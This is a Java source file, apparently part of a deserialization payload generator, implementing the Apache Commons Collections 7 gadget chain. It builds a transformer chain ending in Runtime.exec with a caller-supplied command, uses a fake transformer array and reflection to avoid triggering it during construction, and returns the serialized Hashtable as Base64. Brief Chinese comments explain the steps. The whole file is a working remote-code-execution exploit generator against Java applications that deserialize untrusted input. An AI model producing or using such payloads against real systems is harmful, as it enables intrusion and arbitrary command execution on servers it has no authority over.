package org.hasret.webserigen.payloads;
/**
 * 类描述
 *
 * @author Double
 * @version 1.0
 * @since 2025/4/3
 */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.hasret.webserigen.utils.serial;


import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        String s = generatePayload("calc");
    }
    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformer = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{cmd})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "test");
        hashtable.put(lazyMap2, "test");


        //通过反射设置真的 ransformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=>yy，所以这里要移除
        lazyMap2.remove("yy");

//        serial.unserialize("ser.bin");
        return serial.serializeBytesToB64(hashtable);

    }
}
